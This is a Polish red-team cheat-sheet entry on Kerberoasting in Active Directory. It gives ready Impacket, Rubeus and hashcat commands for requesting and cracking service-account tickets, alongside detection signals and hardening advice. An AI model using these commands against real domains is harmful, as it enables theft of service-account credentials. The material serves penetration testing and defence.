---
title: "Kerberoasting"
category: "red-team"
tags: ["active-directory", "kerberos", "credential-access"]
platform: "windows"
mitre: ["T1558.003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Kerberoasting

## TL;DR
Każdy uwierzytelniony użytkownik może poprosić o bilet usługi (TGS) dla konta z SPN. Bilet jest szyfrowany hashem hasła konta usługowego → offline crack. Konta serwisowe często mają słabe, stałe hasła.

## Wymagania / Kontekst
- Dowolne poświadczenia domenowe (nawet low-priv).
- Konto docelowe ma ustawiony SPN (`servicePrincipalName`).

## Komendy
```bash
# Z Linuksa (Impacket) – wypisz kerberoastable i zgarnij hashe
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/user:'Pass' -outputfile hashes.txt

# Targetowany na jedno konto
impacket-GetUserSPNs -request-user svc_sql -dc-ip 10.10.10.10 corp.local/user:'Pass'
```
```powershell
# Z Windows (Rubeus)
Rubeus.exe kerberoast /outfile:hashes.txt
# tylko słabe (RC4)
Rubeus.exe kerberoast /rc4opsec
```

## Cracking
```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
# 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
```

## Wykrywanie (Blue Team)
```text
Event 4769 (TGS request) z:
 - Ticket Encryption Type 0x17 (RC4)  <- podejrzane w środowisku AES
 - jeden użytkownik żądający wielu SPN w krótkim czasie
```
- Honeypot: konto z SPN i długim hasłem — każde 4769 na nie = alert.

## Mitygacja / Hardening
- **gMSA / dMSA** (hasła 120+ znaków, auto-rotacja).
- Wymuś AES na kontach usługowych (wyłącz RC4), długie hasła (25+).
- Minimalizuj konta z SPN; usuń nieużywane SPN.

## Uwagi / Pułapki
- `/rc4opsec` bierze tylko konta wciąż dopuszczające RC4 (ciszej niż masowy roast).

## Źródła
- [Rubeus](https://github.com/GhostPack/Rubeus) · [MITRE T1558.003](https://attack.mitre.org/techniques/T1558/003/)
